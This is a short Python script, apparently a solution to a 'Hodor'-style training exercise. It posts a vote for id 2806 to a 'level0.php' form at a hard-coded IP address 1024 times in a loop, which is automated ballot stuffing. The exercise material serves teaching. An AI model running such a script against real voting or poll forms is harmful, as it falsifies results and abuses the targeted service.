#!/usr/bin/python3
import requests

x = "http://158.69.76.135/level0.php"
payload = {'id': '2806', 'holdthedoor': 'Enviar'}

for i in range(1024):
        ho = requests.post(x, data = payload)
        print("Vote n*{:d} Code:{}".format(i, ho))
